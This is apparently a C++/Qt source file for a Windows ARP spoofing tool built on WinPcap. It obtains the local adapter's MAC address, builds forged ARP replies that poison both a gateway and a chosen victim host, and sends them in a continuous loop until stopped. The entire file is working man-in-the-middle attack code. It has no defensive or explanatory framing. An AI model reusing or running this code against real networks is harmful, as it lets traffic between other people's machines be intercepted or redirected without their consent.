#include "arpspoof.h"
#include "QDebug"
SpoofThread::SpoofThread(pcap_t *adhandle, pcap_if_t *dev, u_long gate_ip, u_long victim_ip, u_char * gate_mac, u_char * victim_mac)
{
    stopped = false;
    this->gate_ip=gate_ip;
    this->victim_ip=victim_ip;
    //this->gate_mac=gate_mac;
    memcpy(this->gate_mac, gate_mac, 6); //MEMCPY content rather than give pointer
    //this->victim_mac=victim_mac;
    memcpy(this->victim_mac, victim_mac, 6);
    this->dev = dev;
    this->adhandle = adhandle;

  /*  char dbgstr[128];
    qDebug()<<"Thread Created : gate_mac/victim_mac = " ;
    sprintf(dbgstr,"%ud-%ud-%ud-%ud-%ud-%ud, %2x-%2x-%2x-%2x-%2x-%2x",
            gate_mac[0],gate_mac[1],gate_mac[2],
            gate_mac[3],gate_mac[4],gate_mac[5],
            victim_mac[0],victim_mac[1],victim_mac[2],
            victim_mac[3],victim_mac[4],victim_mac[5]);
    qDebug()<<dbgstr;*/

}

void SpoofThread::run()
{
    struct tm *ltime;
    time_t local_tv_sec;
    char timestr[64];

    if(-1==getMac()) return;

    makeSpoofpacket(arppacket_GATE,victim_ip, gate_ip, victim_mac);
    makeSpoofpacket(arppacket_HOST,gate_ip, victim_ip, gate_mac);
while(stopped!=true)
{

    emit spoofSent(QString("====="));
    for(int i=0; i<10; i++)
    {
        if(-1==pcap_sendpacket(adhandle, (u_char *)&arppacket_GATE, 42))
        {
            emit spoofSent("(spoof) GATE <Fail> "+QString::number(i));
        }
        emit spoofSent("(spoof) GATE <Success> "+QString::number(i));
        Sleep(200);
    }
    emit spoofSent(QString("-----"));
    for(int i=0; i<10; i++)
    {

        if(-1==pcap_sendpacket(adhandle, (u_char *)&arppacket_HOST, 42))
        {
            emit spoofSent("(spoof) HOST <Fail> "+QString::number(i));
        }
        emit spoofSent("(spoof) HOST <Success> "+QString::number(i));
        Sleep(200);
    }

}
}


void SpoofThread::makeSpoofpacket(arp_packet &product,u_long tellee_ip, u_long victim_ip, u_char * tellee_mac)
{
    arp_packet arppack;
    //设置目的MAC地址
    memcpy(arppack.dest_mac, tellee_mac, 6);
    //源MAC地址
    memcpy(arppack.src_mac, selfMac, 6);
    //上层协议为ARP协议
    arppack.eh_type = htons(0x0806);
    //硬件类型，Ethernet是0x0001
    arppack.hardware_type = htons(0x0001);
    //上层协议类型，IP为0x0800
    arppack.protocol_type = htons(0x0800);
    //硬件地址长度
    arppack.add_len = 0x06;
    //协议地址长度
    arppack.pro_len = 0x04;
    //操作，arp应答为2
    arppack.option = htons(0x0002);
    //源MAC地址
    memcpy(arppack.sour_addr, selfMac, 6);
    //源IP地址，即伪造的源IP地址
    arppack.sour_ip = victim_ip;
    //目的MAC地址
    memcpy(arppack.dest_addr, tellee_mac, 6);
    //目的IP地址
    arppack.dest_ip = tellee_ip;


    /*char dbgstr[128];
       qDebug()<<"Packet Made : dest_mac /victim_mac = " ;
       sprintf(dbgstr,"%ud-%ud-%ud-%ud-%ud-%ud, %2x-%2x-%2x-%2x-%2x-%2x",
               arppack.dest_mac[0],arppack.dest_mac[1],arppack.dest_mac[2],
               arppack.dest_mac[3],arppack.dest_mac[4],arppack.dest_mac[5],
               tellee_mac[0],tellee_mac[1],tellee_mac[2],
               tellee_mac[3],tellee_mac[4],tellee_mac[5]);
       qDebug()<<dbgstr;*/

    product = arppack;

    //return (u_char *)(&arppack);
}

int SpoofThread::getMac()
{
        memset(selfMac, 0, sizeof(selfMac));
        char * devName = (char *)((dev->name)+8);
        LPADAPTER lpAdapter = PacketOpenAdapter(devName);
        if (!lpAdapter || (lpAdapter->hFile == INVALID_HANDLE_VALUE))
            return -1;
        //allocate a buffer to get the MAC address
        PPACKET_OID_DATA OidData = (PPACKET_OID_DATA)malloc(6 + sizeof(PACKET_OID_DATA));
        if (OidData == NULL)
        {
            printf("error allocating memory!\n");
            PacketCloseAdapter(lpAdapter);
            return -1;
        }

        //retrive the adapter MAC querying the NIC driver
        OidData->Oid = 0x01010102;//OID_802_3_CURRENT_ADDRESS;
        OidData->Length = 6;
        memset(OidData->Data, 0, 6);
        BOOLEAN Status = PacketRequest(lpAdapter, false, OidData);
        if (Status)
            memcpy(selfMac, (u_char *)(OidData->Data), 6);
        free(OidData);
        PacketCloseAdapter(lpAdapter);
        return 0;


}

void SpoofThread::stop()
{
    QMutexLocker locker(&m_lock);
    stopped = true;
}
